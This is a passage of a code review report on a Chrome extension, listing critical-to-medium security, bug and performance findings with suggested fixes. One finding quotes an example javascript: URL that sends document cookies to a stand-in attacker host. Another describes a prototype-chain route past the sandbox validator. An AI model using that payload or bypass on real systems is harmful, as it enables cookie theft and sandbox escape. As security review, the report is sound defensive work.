# Cohand Chrome Extension -- Unified Code Review Report

**Date:** 2026-03-12
**Reviewers:** Claude (Security, Code Quality, Bug Detection, Architecture, Error Handling, Performance) + Codex (Security, Code Quality, Bug Detection, Architecture, Error Handling, Performance)
**Codebase:** WXT + React + TypeScript + Zustand Chrome Extension (MV3)

---

## Summary Table

| Severity | Count | Key Areas |
|----------|-------|-----------|
| **Critical** | 3 | Remote auth bypass, `Page.navigate` domain escape, AST validator bypass |
| **High** | 20 | Sandbox escape, no timeout/abort, postMessage `'*'`, tab claim bugs, recording persistence, re-render cascades, MV3 state loss |
| **Medium** | 51 | Token handling, race conditions, dead features, IDB patterns, type safety, error handling inconsistency, performance |
| **Low** | 15 | Dead code, magic numbers, minor UI bugs, string duplication |
| **Total** | **89** | |

> **89 unique findings** after deduplication across 12 independent reviews. Many were identified by multiple reviewers independently (see Cross-Reviewer Agreement section below).

---

## Cross-Reviewer Agreement (Highest-Confidence Findings)

These findings were independently identified by 3+ reviewers and represent the strongest consensus issues:

| Finding | Reviewers | Severity |
|---------|-----------|----------|
| Remote `disconnect` does not release claimed tabs | Claude Security, Claude Bug, Claude Architecture, Codex Security, Codex Bug, Codex Error | Critical/High |
| Sandbox execution has no timeout/abort | Claude Security, Claude Bug, Claude Error, Codex Bug, Codex Error, Codex Performance | High |
| postMessage target origin falls back to `'*'` | Claude Security, Claude Error, Codex Security | High |
| Sandbox `main.ts` no origin validation on incoming messages | Claude Security | High |
| Recording steps persisted with empty `recordingId` / zero `sequenceIndex` | Claude Bug, Codex Bug, Codex Architecture | High |
| Whole-store Zustand subscriptions cause excess re-renders | Claude Quality, Claude Performance, Codex Quality, Codex Performance | High/Medium |
| Inconsistent error handling across stores (`any` vs `unknown` vs `String`) | Claude Quality, Claude Architecture, Codex Quality | Medium |
| Task deletion does not cascade to related records | Claude Architecture, Codex Architecture | High/Medium |
| `GENERATE_SCRIPT` handler returns wrong type, uses `as any` | Claude Quality, Claude Architecture, Codex Quality | Medium |
| Self-healing / `notify` RPC not wired into production | Claude Architecture | Medium |
| `cleanupStaleOAuthState` checks wrong storage keys | Claude Bug, Claude Error | Medium |
| `KEYSTROKE_UPDATE` messages sent but never handled | Claude Security, Codex Performance | Low/Medium |
| Encryption key stored adjacent to ciphertext | Claude Security, Claude Architecture | Medium (acknowledged) |
| QuickJS pool exists but is unused | Claude Architecture, Claude Performance, Codex Performance | Medium |
| Background.ts is a monolithic god object | Claude Architecture, Codex Architecture | High |
| No React Error Boundary | Claude Error, Codex Error | High |
| Settings persist on every keystroke | Codex Quality, Codex Performance | Medium |

---

## Critical Findings

### [C1] Undefined Token Authenticates Fresh Install (Remote Mode Auth Bypass)
**Severity:** Critical
**Category:** Security
**Found by:** Codex Security
**Files:** `src/lib/remote/remote-auth.ts:20-22`, `src/lib/remote/remote-server.ts:49-67`, `src/entrypoints/background.ts:156-158`
**Description:** `validateToken()` performs a raw equality check against `chrome.storage.local['remote_auth_token']`. If the token has never been provisioned (fresh install), both the stored value and `message.token` are `undefined`, so `validateToken(undefined)` returns `true`. The background worker registers `onMessageExternal` unconditionally on startup, and there is no `externally_connectable` allowlist in the manifest.
**Impact:** Any installed extension that knows Cohand's extension ID can authenticate without a token and gain CDP-backed remote control over user-permitted domains.
**Suggested fix:** Fail closed when no stored token exists. Require `message.token` to be a non-empty string before comparison. Do not register remote mode until a token is explicitly provisioned. Add an `externally_connectable.ids` allowlist.

---

### [C2] Page.navigate Bypasses Domain Boundary via `javascript:` / `data:` Schemes
**Severity:** Critical
**Category:** Security
**Found by:** Codex Security, Claude Security (partial -- see also H5)
**Files:** `src/lib/remote/remote-relay.ts:145-163`, `src/lib/remote/remote-relay.ts:190-199`
**Description:** The relay validates the current tab URL against `allowedDomains` but for `Page.navigate` it never validates `command.params.url` against `allowedDomains`. The sensitive-scheme blocklist omits `javascript:` and `data:`. A remote client authenticated for `example.com` can navigate to `javascript:fetch('https://attacker.tld/?d='+document.cookie)` while the tab is on the allowed domain.
**Impact:** Defeats the ban on `Runtime.evaluate` and enables arbitrary script execution or cross-domain navigation/exfiltration.
**Suggested fix:** Validate the target URL itself with `isDomainAllowed(targetUrl, allowedDomains)` and reject any scheme except `http:`/`https:`. Explicitly block `javascript:`, `data:`, `blob:`.

---

### [C3] AST Validator Bypass via `Object.getPrototypeOf` to Reach `Function` Constructor
**Severity:** Critical
**Category:** Security
**Found by:** Claude Security
**Files:** `src/lib/security/ast-validator.ts:10-30`
**Description:** The AST validator blocks `constructor`, `__proto__`, `prototype` as member names, but does not block `Object` as a global or reflection APIs like `getOwnPropertyDescriptor`, `getPrototypeOf`. An attacker can chain `Object.getPrototypeOf(Object.getPrototypeOf(async function(){}.constructor))` to reach the `Function` constructor inside QuickJS.
**Impact:** Achieving `Function` constructor access inside QuickJS could allow arbitrary code generation that bypasses the script's expected structure.
**Suggested fix:** Add `Object` to `BLOCKED_GLOBALS`, or add `getOwnPropertyDescriptor`, `getPrototypeOf`, `getOwnPropertyNames`, `defineProperty`, `assign`, `create` to `BLOCKED_MEMBERS`.

---

## High Findings

### [H1] `new Function()` Fallback in `script-executor.ts` -- Sandbox Escape
**Severity:** High
**Category:** Security
**Found by:** Claude Security, Codex Architecture
**Files:** `src/lib/script-executor.ts:70`
**Description:** `executeScript` uses `new Function('page', 'context', ...)` to execute user-provided script source. If this code path is ever invoked outside the QuickJS WASM sandbox (testing, dev, or offscreen architecture failure), the script runs with full access to the JavaScript environment. Two execution abstractions exist in the repo with different protocols.
**Impact:** Potential sandbox escape if the fallback path is invoked in a privileged context.
**Suggested fix:** Remove `script-executor.ts` or add a runtime guard that throws if it detects a privileged context (e.g., `chrome.runtime` presence). Converge on one execution contract.

---

### [H2] Sandbox Execution Has No Timeout or Abort
**Severity:** High
**Category:** Bug / Error Handling
**Found by:** Claude Bug, Claude Error, Codex Bug, Codex Error, Codex Performance
**Files:** `src/lib/execution-orchestrator.ts:112`, `src/entrypoints/offscreen/main.ts:46-64`, `src/lib/sandbox-bridge.ts:88-103`
**Description:** Multiple layers lack timeouts: (1) The `SANDBOX_EXECUTE` message via `chrome.runtime.sendMessage` has no timeout. (2) The offscreen document's promise waits indefinitely for the sandbox iframe to respond. (3) The `SandboxBridge.onExecutionResult` listener has no timeout. (4) The `AbortController` is checked only after sandbox execution completes, so abort has no effect during execution.
**Impact:** If the sandbox crashes, hangs, or the offscreen document is unresponsive, the execution promise hangs forever, blocking the tab claim and debugger attachment indefinitely.
**Suggested fix:** Add `Promise.race` with a timeout (`QUICKJS_TIMEOUT_MS + buffer`) at each layer. Plumb cancellation into the offscreen/sandbox side. Add a `SANDBOX_CANCEL` message type.

---

### [H3] `postMessage` Target Origin Falls Back to `'*'` Wildcard
**Severity:** High
**Category:** Security
**Found by:** Claude Security, Claude Error
**Files:** `src/lib/sandbox-bridge.ts:106-111`, `src/entrypoints/sandbox/main.ts:9`
**Description:** Both the `SandboxBridge` and the sandbox `main.ts` fall back to `'*'` as the target origin when `chrome.runtime.getURL` is unavailable. If `chrome.runtime` is undefined in any production path, messages containing script source, execution results, and RPC data could be broadcast to any origin.
**Impact:** Outgoing messages with `'*'` as target could be intercepted by a malicious iframe.
**Suggested fix:** Never fall back to `'*'`. Throw an error if origin cannot be determined. In tests, mock `chrome.runtime.getURL`.

---

### [H4] Sandbox `main.ts` Does Not Validate `event.origin` on Incoming Messages
**Severity:** High
**Category:** Security
**Found by:** Claude Security
**Files:** `src/entrypoints/sandbox/main.ts:25-66`
**Description:** The sandbox iframe's message listener does not validate `event.origin` or `event.source`. Any window that can get a reference to the sandbox iframe can send `execute-script` messages containing arbitrary source code.
**Impact:** An attacker could inject script execution requests into the sandbox, and results (including RPC calls) flow back to the parent.
**Suggested fix:** Add origin validation: `if (event.origin !== PARENT_ORIGIN && PARENT_ORIGIN !== '*') return;` and validate `event.source === window.parent`.

---

### [H5] Recording `value` Attribute Captures Passwords from Autofilled Fields
**Severity:** High
**Category:** Security
**Found by:** Claude Security
**Files:** `src/lib/recording/element-selector.ts:183-186`
**Description:** The `ALLOWED_ATTRIBUTES` set includes `value`. While `isSensitiveInput()` redacts `typedText` for password fields during keystroke tracking, the `collectElementMeta()` function captures all attributes including `value` without a sensitivity check. Autofilled password fields leak their value on click events.
**Impact:** Password values captured in recording steps, stored in IndexedDB, and potentially sent to the LLM.
**Suggested fix:** Remove `value` from `ALLOWED_ATTRIBUTES`, or add a sensitivity check before capturing the `value` attribute.

---

### [H6] Remote `disconnect` Does Not Release Claimed Tabs
**Severity:** High
**Category:** Bug / Security
**Found by:** Claude Security, Claude Bug, Claude Architecture, Codex Security, Codex Bug, Codex Error, Codex Performance
**Files:** `src/lib/remote/remote-server.ts:94-97`, `src/lib/remote/remote-relay.ts:31-52`
**Description:** When a remote client sends `remote:disconnect`, the session is removed from `activeSessions` but tabs claimed via `claimTab(tabId, 'remote', extensionId)` are never released. Those tabs remain permanently locked as "remote" in `tabOwnership`, preventing local tasks and new remote sessions from using them. Additionally, remote CDP attachments are never detached.
**Impact:** A malicious or buggy remote client can strand tabs, creating a persistent denial-of-service for local automation.
**Suggested fix:** Track claimed tab IDs per session. On `remote:disconnect`, release all tabs owned by that session and detach CDP.

---

### [H7] Remote Tab Claim Before Validation -- Leaked Claims on Denied Commands
**Severity:** High
**Category:** Bug
**Found by:** Codex Bug, Codex Error
**Files:** `src/lib/remote/remote-relay.ts:136-163`
**Description:** `executeRemoteCommand()` claims the tab before validating URL, domain, method allowlist, or sensitive navigation. All validation failure paths return without releasing the claim.
**Impact:** The first remote command against an unclaimed tab that is denied leaves the tab stuck in remote ownership, blocking local execution.
**Suggested fix:** Validate before `claimTab`, or release the claim in every failure path and the catch block.

---

### [H8] Token Rotation Does Not Revoke Active Sessions
**Severity:** High
**Category:** Security
**Found by:** Codex Security
**Files:** `src/lib/remote/remote-auth.ts:25-28`, `src/lib/remote/remote-server.ts:62-72`
**Description:** Authentication is checked only during `remote:auth`. Later commands are authorized solely by presence in `activeSessions`. `regenerateToken()` overwrites storage but does not clear `activeSessions`.
**Impact:** An attacker that authenticates once keeps a live session even after the user rotates the token.
**Suggested fix:** On token regeneration, clear `activeSessions` and release owned tabs. Optionally re-validate tokens on each command.

---

### [H9] Execution Abort Race -- Old Run's Finally Block Clears New Run's State
**Severity:** High
**Category:** Bug
**Found by:** Claude Bug (partial), Codex Bug
**Files:** `src/lib/execution-orchestrator.ts:60, 175`
**Description:** A newer execution for the same `taskId` aborts the old controller, but the old run's `finally` block unconditionally deletes `taskTabMap`/`executionAbortControllers` and releases the tab, clearing the second run's state.
**Impact:** Starting the same task twice before the first completes causes the second execution to lose its tab mapping and abort controller.
**Suggested fix:** Give each run a unique execution token and only clear maps/release the tab if the map entry still belongs to that token.

---

### [H10] Local Tab Claim Overwrite -- Two Local Tasks on Same Tab
**Severity:** High
**Category:** Bug
**Found by:** Claude Bug
**Files:** `src/lib/remote/remote-relay.ts:33-41`
**Description:** `claimTab` only blocks claims where `current.owner !== mode`. If two different local tasks try to claim the same tab, the second succeeds and overwrites the first task's ownership record.
**Impact:** First task still thinks it owns the tab; when it finishes, `releaseTab` releases the tab from under the second task.
**Suggested fix:** Track the taskId or execution ID in the ownership record for local mode.

---

### [H11] Recording Steps Persisted with Empty `recordingId` and Zero `sequenceIndex`
**Severity:** High
**Category:** Bug
**Found by:** Claude Bug, Codex Bug, Codex Architecture
**Files:** `src/entrypoints/background.ts:540-551`
**Description:** Recording steps are created with `recordingId: ''` and `sequenceIndex: 0`, persisted to IndexedDB before the sidepanel store assigns values. The sidepanel's `appendStep` only updates in-memory state, not the IndexedDB record.
**Impact:** All persisted recording steps have empty `recordingId` and zero `sequenceIndex`. Querying `getRecordingSteps(db, sessionId)` returns no results. Replay, recovery, and import/export are broken.
**Suggested fix:** Have the background own the active recording session ID and next sequence number. Write correct values before `putRecordingStep`.

---

### [H12] No React Error Boundary -- Any Render Error Blanks the Sidepanel
**Severity:** High
**Category:** Error Handling
**Found by:** Claude Error, Codex Error
**Files:** `src/entrypoints/sidepanel/App.tsx`, `src/entrypoints/sidepanel/index.tsx`
**Description:** There is no React Error Boundary component. Any unhandled render-time exception in any component will crash the entire sidepanel with a white screen and no recovery path.
**Impact:** A single component error (e.g., bad data shape) brings down the entire UI.
**Suggested fix:** Wrap the root `<App />` in an Error Boundary with a user-friendly error screen and recovery button.

---

### [H13] Background `init()` Swallows Fatal Startup Errors
**Severity:** High
**Category:** Error Handling
**Found by:** Claude Error, Codex Error
**Files:** `src/entrypoints/background.ts:119-183`
**Description:** `init()` wraps everything in a single try/catch that only logs. If `openDB()` fails, `db` remains `undefined`. The router gate still opens, and all subsequent handlers crash with `TypeError: Cannot read properties of undefined`.
**Impact:** Extension appears to load but nothing works. Every operation produces confusing downstream errors.
**Suggested fix:** Fail closed on init. Keep the gate blocked. Return a structured "background unavailable" response.

---

### [H14] `Runtime.evaluate` Used in Local `title` Handler
**Severity:** High
**Category:** Security
**Found by:** Claude Security
**Files:** `src/lib/humanized-page-handler.ts:302-306`
**Description:** The `title` RPC handler executes `Runtime.evaluate` with `'document.title'`. While the expression is hardcoded and safe, the remote relay's `ALLOWED_CDP_METHODS` correctly excludes `Runtime.evaluate`, but the local path calls it directly, bypassing the whitelist.
**Impact:** Dangerous pattern that could lead to user-controlled input in `Runtime.evaluate` calls if future modifications are not careful.
**Suggested fix:** Use `Page.getFrameTree` for title, or add a prominent security comment with an assertion.

---

### [H15] Message Router Errors Not Handled by Stores
**Severity:** High
**Category:** Error Handling / Architecture
**Found by:** Codex Quality, Codex Error
**Files:** `src/lib/message-router.ts:25`, `src/entrypoints/sidepanel/stores/tasks-store.ts:33`, `src/entrypoints/sidepanel/stores/wizard-store.ts:95`
**Description:** `MessageRouter` normalizes handler failures into resolved `{ error }` payloads, but most sidepanel stores assume `sendMessage()` failures reject. Backend failures can look like valid empty data.
**Impact:** UI can treat failures as success, show empty data, or close flows even though nothing worked.
**Suggested fix:** Standardize on a typed `{ ok, error }` envelope or reject on router failure in one shared client wrapper.

---

### [H16] Streaming Chat Causes Full Message Array Reconstruction Per Token
**Severity:** High
**Category:** Performance
**Found by:** Claude Performance, Codex Performance
**Files:** `src/entrypoints/sidepanel/stores/chat-store.ts:107`, `src/entrypoints/sidepanel/pages/ChatPage.tsx:10`
**Description:** During streaming, the `messages` array is updated on every text delta (hundreds of times per response) via `set({ messages: [...] })`. ChatPage subscribes to the entire store, so the full component tree (all message bubbles, scroll effect) re-renders on each token.
**Impact:** Significant render overhead that grows with `message_count x chunk_count`.
**Suggested fix:** Extract message list into a separate `<MessageList />` component with narrow subscription. Memoize `ChatMessageBubble`. Access action functions via `getState()` instead of subscriptions.

---

### [H17] MV3 Service Worker In-Memory State Lost on Termination
**Severity:** High
**Category:** Performance / Architecture
**Found by:** Claude Performance, Codex Performance, Codex Architecture
**Files:** `src/entrypoints/background.ts:79-83`
**Description:** `taskTabMap`, `executionAbortControllers`, and `testDomainOverrides` are in-memory `Map`s. MV3 workers are terminated after ~30s of inactivity. In-flight task execution state, abort controllers, and tab mappings are all lost.
**Impact:** Orphaned executions, lost tab claims, unable to cancel running tasks after worker restart.
**Suggested fix:** Persist `taskTabMap` to `chrome.storage.session`. Accept worker termination as a lifecycle boundary and add startup recovery.

---

### [H18] Recording Port Lifecycle Tied to ChatPage Mount
**Severity:** High
**Category:** Architecture / Bug
**Found by:** Codex Architecture, Codex Error
**Files:** `src/entrypoints/sidepanel/pages/ChatPage.tsx:24-36`, `src/entrypoints/sidepanel/App.tsx`
**Description:** The `recording-stream` port connection is created in ChatPage's `useEffect`. Switching tabs or opening settings unmounts ChatPage, disconnecting the port even if recording is still active.
**Impact:** Steps and snapshots stop arriving in the UI while the background continues recording.
**Suggested fix:** Move port connection into a long-lived recording coordinator or the recording store, independent of page mounting.

---

### [H19] `buildWrapperScript()` Does Not `await` Async `run()`
**Severity:** High
**Category:** Bug / Code Quality
**Found by:** Codex Quality
**Files:** `src/lib/quickjs-runner.ts:124`
**Description:** `buildWrapperScript()` calls `run(page, context)` without `await`, even though the executor is documented as supporting async scripts. Async tasks return a serialized promise or incomplete result.
**Impact:** Any async user script silently returns wrong results.
**Suggested fix:** `await run(page, context)` inside the wrapper. Add an integration test with an async `run()`.

---

### [H20] Screenshot Captured on Every Recording Action
**Severity:** High
**Category:** Performance
**Found by:** Claude Performance, Codex Performance
**Files:** `src/entrypoints/background.ts:528-536, 554`
**Description:** `chrome.tabs.captureVisibleTab()` is called for every single recording action. Each screenshot is a full base64 PNG (500KB-2MB). The screenshot is then serialized through `recordingPort.postMessage`.
**Impact:** Significant CPU, memory overhead, and UI jank during active recording.
**Suggested fix:** Debounce/throttle screenshots (max 1 per 500ms). Skip for `type` actions. Strip screenshot from port message (it's already stripped from IndexedDB persist).

---

## Medium Findings

### [M1] Remote Token Timing Attack
**Severity:** Medium
**Category:** Security
**Found by:** Claude Security
**Files:** `src/lib/remote/remote-auth.ts:22`
**Description:** Token validation uses `===` which short-circuits on first differing byte, enabling timing side-channel attacks.
**Suggested fix:** Use constant-time comparison.

---

### [M2] No Remote Session Expiry / Idle Timeout
**Severity:** Medium
**Category:** Security
**Found by:** Claude Security
**Files:** `src/lib/remote/remote-server.ts:62-66`
**Description:** Once authenticated, sessions live indefinitely. `authenticatedAt` is recorded but never checked.
**Suggested fix:** Add session TTL check (1-4 hours).

---

### [M3] No Rate Limiting on Remote Auth Attempts
**Severity:** Medium
**Category:** Security
**Found by:** Claude Security
**Files:** `src/lib/remote/remote-server.ts:48-68`
**Description:** Unlimited `chrome.runtime.sendMessageExternal` auth attempts. Combined with timing attack (M1), enables online token guessing.
**Suggested fix:** Implement exponential backoff or lockout after N failed attempts.

---

### [M4] `onMessageExternal` Accepts Messages from Any Extension
**Severity:** Medium
**Category:** Security
**Found by:** Claude Security
**Files:** `src/entrypoints/background.ts:158`
**Description:** No `externally_connectable` manifest key to restrict which extensions can send messages.
**Suggested fix:** Add `externally_connectable.ids` allowlist, or require explicit user whitelisting.

---

### [M5] Redundant `startsWith` Check Weakens CDP Method Whitelist
**Severity:** Medium
**Category:** Security / Code Quality
**Found by:** Claude Security, Claude Bug
**Files:** `src/lib/remote/remote-relay.ts:166-183`
**Description:** The `startsWith` checks for `Input.dispatchMouseEvent` are redundant (already in `ALLOWED_CDP_METHODS`). The `blockedInputMethods` check is dead code since those methods aren't in the whitelist.
**Suggested fix:** Remove redundant `startsWith` checks and `blockedInputMethods` block.

---

### [M6] `goto` Handler Lacks Sensitive URL Scheme Check (Local Path)
**Severity:** Medium
**Category:** Security
**Found by:** Claude Security
**Files:** `src/lib/humanized-page-handler.ts:139-155`
**Description:** The remote relay has sensitive URL scheme checks, but the local `goto` handler only checks domain, not schemes (`javascript:`, `file:`, `about:`).
**Suggested fix:** Add `isSensitivePage()` / scheme check to the local `goto` handler.

---

### [M7] Encryption Key Stored Adjacent to Ciphertext
**Severity:** Medium (acknowledged)
**Category:** Security
**Found by:** Claude Security, Claude Architecture
**Files:** `src/lib/crypto.ts`, `src/lib/storage.ts:67-74`
**Description:** AES-GCM encryption key stored in `chrome.storage.local` alongside encrypted data. Code comments acknowledge this limitation.
**Suggested fix:** Consider user-provided passphrase or `chrome.storage.session` for the key.

---

### [M8] Decrypted LLM Credentials Cached in Zustand State After Logout
**Severity:** Medium
**Category:** Security
**Found by:** Codex Security
**Files:** `src/entrypoints/sidepanel/stores/chat-store.ts:21,49,61`, `src/entrypoints/sidepanel/stores/settings-store.ts:98,138`
**Description:** `initClient()` stores the plaintext API token in `useChatStore.apiKey`. `clearApiKey()` and `logoutCodex()` only clear storage/flags in settings store; they never invalidate the chat store's cached token.
**Impact:** Old credentials remain usable from the still-open chat page after logout.
**Suggested fix:** Resolve the key/token per request, or on logout explicitly clear `useChatStore` state and abort active streams.

---

### [M9] `cleanupStaleOAuthState` Checks Wrong Storage Keys
**Severity:** Medium
**Category:** Bug
**Found by:** Claude Bug, Claude Error
**Files:** `src/lib/codex-oauth.ts:218-224`
**Description:** Cleanup function reads `pkceState`, `pkceTimestamp`, `pkceVerifier` but OAuth flow stores under `_oauthPkce` (an object with `{ verifier, state, createdAt }`). The cleanup is effectively a no-op.
**Suggested fix:** Update to check `_oauthPkce` and `_oauthPkce.createdAt`.

---

### [M10] `setInterval` Timer Leak in OAuth Adaptive Monitor
**Severity:** Medium
**Category:** Bug
**Found by:** Claude Bug
**Files:** `src/lib/codex-oauth.ts:114, 169-197`
**Description:** If service worker terminates during OAuth flow, `removeOAuthRedirectRule()` may never be called, leaving the redirect rule permanently active.
**Suggested fix:** Use `chrome.alarms` instead of `setInterval` for the adaptive monitor.

---

### [M11] `RPC port.postMessage` After Disconnect
**Severity:** Medium
**Category:** Bug / Error Handling
**Found by:** Claude Bug, Codex Bug
**Files:** `src/lib/rpc-handler.ts:39-48`, `src/lib/rpc-client.ts:74`
**Description:** In `handleConnection`, async handler completion followed by `port.postMessage` on a disconnected port throws an uncaught exception. No `onDisconnect` handler is registered.
**Suggested fix:** Track port liveness via `onDisconnect`. Wrap `postMessage` in try/catch. Clear pending entries on disconnect.

---

### [M12] Recording Step ID Collision from `Date.now()` in Rapid Actions
**Severity:** Medium
**Category:** Bug
**Found by:** Claude Bug
**Files:** `src/entrypoints/background.ts:541`
**Description:** Step IDs are `step-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`. Duplicate key in IndexedDB `put()` silently overwrites previous step.
**Suggested fix:** Use `crypto.randomUUID()`.

---

### [M13] Concurrent `ensureOffscreen` Calls Race
**Severity:** Medium
**Category:** Bug
**Found by:** Claude Bug
**Files:** `src/entrypoints/background.ts:99-114`
**Description:** `ensureOffscreen` is not synchronized. Two simultaneous tasks could both pass `existingContexts.length === 0` check and the second `createDocument` throws.
**Suggested fix:** Cache the creation promise (memoize).

---

### [M14] Wizard `startObservation` Accesses `treeResponse.tree` Without Null Guard
**Severity:** Medium
**Category:** Bug
**Found by:** Claude Bug, Claude Error
**Files:** `src/entrypoints/sidepanel/stores/wizard-store.ts:113`
**Description:** If content script is not loaded (restricted page), `sendMessage` returns `undefined`, causing `TypeError`.
**Suggested fix:** Add `const tree = treeResponse?.tree ?? null` with proper error handling.

---

### [M15] Wizard `startObservation` Has No Stale-Completion Guard
**Severity:** Medium
**Category:** Bug
**Found by:** Codex Bug
**Files:** `src/entrypoints/sidepanel/stores/wizard-store.ts:88`
**Description:** No request ID or abort guard. If user resets the wizard while `startObservation()` is running, the late async result overwrites the reset state.
**Suggested fix:** Assign each observation run an ID and ignore stale completions.

---

### [M16] Concurrent `sendMessage` Calls Share Single Abort Controller
**Severity:** Medium
**Category:** Bug
**Found by:** Codex Bug
**Files:** `src/entrypoints/sidepanel/stores/chat-store.ts:60, 128`
**Description:** Multiple concurrent `sendMessage` calls share one global `abortController` and `isStreaming` flag. The second call's cancellation only affects the latest stream.
**Suggested fix:** Reject or queue new sends while streaming, or track state per message ID.

---

### [M17] Pause Recording is UI-Only -- Steps Still Arrive
**Severity:** Medium
**Category:** Bug / Code Quality
**Found by:** Codex Bug, Codex Quality
**Files:** `src/entrypoints/sidepanel/stores/recording-store.ts:78-79`
**Description:** `isPaused` and `voiceEnabled` only toggle local UI state. They are not wired into the recording pipeline or speech recognition.
**Suggested fix:** Propagate pause/resume to background/content script and gate step ingestion.

---

### [M18] Pause Speech Recognition Immediately Restarts Due to `sessionActive`
**Severity:** Medium
**Category:** Bug
**Found by:** Codex Bug
**Files:** `src/lib/recording/speech.ts:194, 222`
**Description:** `pauseSpeechRecognition()` calls `recognition.stop()` but `sessionActive` stays `true`, so `onend` immediately restarts recognition.
**Suggested fix:** Add a paused flag or set `sessionActive = false` on pause.

---

### [M19] `recordingPort` Singleton Disconnect Race
**Severity:** Medium
**Category:** Bug
**Found by:** Codex Bug
**Files:** `src/entrypoints/background.ts:149`
**Description:** Each `onDisconnect` callback blindly sets `recordingPort` to `null` without checking if the disconnecting port is still the current one. Sidepanel reconnection after worker restart loses the port.
**Suggested fix:** Only clear `recordingPort` if `recordingPort === port`.

---

### [M20] Scheduler Opens Sidepanel URL But No Bootstrap Code Handles It
**Severity:** Medium
**Category:** Bug
**Found by:** Codex Bug
**Files:** `src/lib/scheduler.ts:66`
**Description:** Scheduled execution opens `sidepanel.html?taskId=...&mode=execute` but there is no code in the sidepanel that reads those query params and starts execution.
**Impact:** Alarms open an idle panel instead of running the task.
**Suggested fix:** Execute directly from background, or add sidepanel startup code that reads `taskId`/`mode=execute`.

---

### [M21] Whole-Store Zustand Subscriptions in Multiple Components
**Severity:** Medium
**Category:** Code Quality / Performance
**Found by:** Claude Quality, Claude Performance, Codex Quality, Codex Performance
**Files:** `CreateTaskWizard.tsx:19`, `SettingsPage.tsx:9-14`, `TasksPage.tsx:10-11`, `ChatPage.tsx:10`, `RecordingToolbar.tsx:6`, `LiveStepList.tsx:13`
**Description:** Multiple components use `useStore()` without selectors, subscribing to the entire store. Every state change re-renders the full component tree.
**Suggested fix:** Use granular `useStore(s => s.field)` selectors. Use `useShallow` from `zustand/react/shallow` where multiple fields are needed.

---

### [M22] `settings-store.ts` Uses `catch (err: any)` -- Unsafe Error Handling
**Severity:** Medium
**Category:** Code Quality
**Found by:** Claude Quality, Claude Architecture
**Files:** `src/entrypoints/sidepanel/stores/settings-store.ts` (7 occurrences)
**Description:** Every catch block uses `catch (err: any)` while other stores correctly use `catch (err: unknown)` with `instanceof Error` check. The `any` annotation silently allows accessing `.message` on non-Error objects.
**Suggested fix:** Standardize on `catch (err: unknown)` with a shared `getErrorMessage(err: unknown): string` utility.

---

### [M23] Task Deletion Does Not Cascade to Related Records
**Severity:** Medium
**Category:** Architecture / Bug
**Found by:** Claude Architecture, Codex Architecture
**Files:** `src/entrypoints/background.ts:228-236`, `src/lib/db-helpers.ts:123`
**Description:** `DELETE_TASK` only deletes from `tasks` store. Related `script_versions`, `script_runs`, `task_state`, `state_snapshots`, `notifications`, and `llm_usage` are orphaned.
**Suggested fix:** Implement cascading delete in a single transaction (like `deleteRecording` already does).

---

### [M24] `GENERATE_SCRIPT` Handler Returns Wrong Type / Dead Code
**Severity:** Medium
**Category:** Code Quality / Architecture
**Found by:** Claude Quality, Claude Architecture, Codex Quality
**Files:** `src/entrypoints/background.ts:293-320`
**Description:** Returns observation data (not a script) with `source: ''` and `as any` to circumvent type mismatch. The wizard store never calls this handler.
**Suggested fix:** Rename to `OBSERVE_PAGE` with proper response type, or remove entirely.

---

### [M25] Self-Healing Module Not Wired Into Execution
**Severity:** Medium
**Category:** Architecture
**Found by:** Claude Architecture
**Files:** `src/lib/self-healing.ts`, `src/lib/execution-orchestrator.ts`
**Description:** `selfHeal` implements repair loops but is never called from production code after failed execution.
**Suggested fix:** Wire into execution orchestrator after failed runs.

---

### [M26] `notify` RPC Method is a No-Op
**Severity:** Medium
**Category:** Architecture
**Found by:** Claude Architecture
**Files:** `src/lib/humanized-page-handler.ts:472-481`
**Description:** Returns `{ queued: true }` but never calls `deliverNotification`. Scripts calling `context.notify()` get a success response but no notification is created.
**Suggested fix:** Wire `deliverNotification` with proper `db`, `taskId`, `taskName`.

---

### [M27] CDP Manager Partial Enable Failures Leave Incomplete State
**Severity:** Medium
**Category:** Error Handling
**Found by:** Claude Error
**Files:** `src/lib/cdp.ts:17-36`
**Description:** After `chrome.debugger.attach`, if `DOM.enable` succeeds but `Page.enable` fails, the debugger is left attached with incomplete enablement.
**Suggested fix:** On any enable failure, detach the debugger and remove the tab from the map before re-throwing.

---

### [M28] `getTabUrl` Has No Error Handling for Closed Tabs
**Severity:** Medium
**Category:** Error Handling
**Found by:** Claude Error
**Files:** `src/entrypoints/background.ts:94-97`
**Description:** `chrome.tabs.get(tabId)` is called without try/catch. If the tab was closed, it throws.
**Suggested fix:** Wrap with try/catch returning descriptive error or empty string.

---

### [M29] Execution Results Not Proactively Surfaced to UI
**Severity:** Medium
**Category:** Error Handling
**Found by:** Claude Error
**Files:** `src/entrypoints/background.ts:261-277`
**Description:** `EXECUTE_TASK` fires `executeTaskAsync` with `.catch(console.error)` and returns `{ ok: true }`. No mechanism to notify UI of completion/failure. User must manually poll.
**Suggested fix:** Push execution-complete events via port, notification, or auto-refresh.

---

### [M30] `tasks-store.ts` Uses `Map` for Runs (Serialization/Equality Issues)
**Severity:** Medium
**Category:** Code Quality / Bug
**Found by:** Claude Bug, Codex Quality
**Files:** `src/entrypoints/sidepanel/stores/tasks-store.ts:50-53`
**Description:** Using `Map` in Zustand state creates new references on every fetch (triggering unnecessary re-renders) and breaks devtools/persistence middleware serialization.
**Suggested fix:** Use `Record<string, ScriptRun[]>` instead of `Map`.

---

### [M31] `hostValueToHandle()` Converts Objects to JSON Strings Instead of QuickJS Values
**Severity:** Medium
**Category:** Bug / Code Quality
**Found by:** Codex Quality
**Files:** `src/lib/quickjs-runner.ts:141, 223`
**Description:** Structured RPC results surface to user scripts as strings, not objects. Users must `JSON.parse` results themselves.
**Suggested fix:** Marshal as proper QuickJS objects or `JSON.parse` inside the VM.

---

### [M32] Typed `keydown` Recording Misses Paste/IME/Autocomplete
**Severity:** Medium
**Category:** Bug
**Found by:** Codex Bug
**Files:** `src/lib/recording/element-selector.ts:257, 300`
**Description:** Typed text reconstructed from `keydown` events misses paste, IME, drag-drop, and autocomplete. `flushKeystrokeBuffer()` drops edits when final value is empty.
**Suggested fix:** Capture `input`/`beforeinput`/`change` events and read the element's real value.

---

### [M33] `startRecording` / `stopRecording` Race Condition
**Severity:** Medium
**Category:** Bug
**Found by:** Codex Bug
**Files:** `src/entrypoints/sidepanel/stores/recording-store.ts:29, 60`
